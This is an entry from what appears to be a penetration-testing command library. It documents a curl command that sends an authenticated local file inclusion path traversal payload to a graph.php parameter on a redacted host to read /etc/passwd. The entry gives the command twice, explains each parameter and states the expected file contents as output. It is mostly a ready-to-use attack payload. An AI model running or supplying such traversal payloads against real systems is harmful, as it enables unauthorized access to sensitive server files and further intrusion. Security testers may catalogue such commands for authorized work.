---
id: cmd-curl-lfi-sensitive
data: >-
  curl -b cookies.txt 'https://████/graph.php?m=../../../../../../etc/passwd' -o
  sensitive_output
tags:
  - lfi
  - sensitive-file
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:05.797Z'
verified: false
validated: true
submitted: true
---
# curl-lfi-sensitive

## Command

```bash
curl -b cookies.txt 'https://████/graph.php?m=../../../../../../etc/passwd' -o sensitive_output
```

## Description

Targets a sensitive file via LFI traversal for escalated impact.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-b cookies.txt` | Auth session | Yes |
| `m=../../../../../../etc/passwd` | Payload to /etc/passwd | Yes |
| `-o sensitive_output` | Save output | Yes |

## Examples

### Basic Usage

```bash
curl -b cookies.txt 'https://████/graph.php?m=../../../../../../etc/passwd' -o sensitive_output
```

## Expected Output

Contents of /etc/passwd file in sensitive_output.

## Related

- [[Related Procedure: Exploit-LFI-Path-Traversal-in-graph.php]]
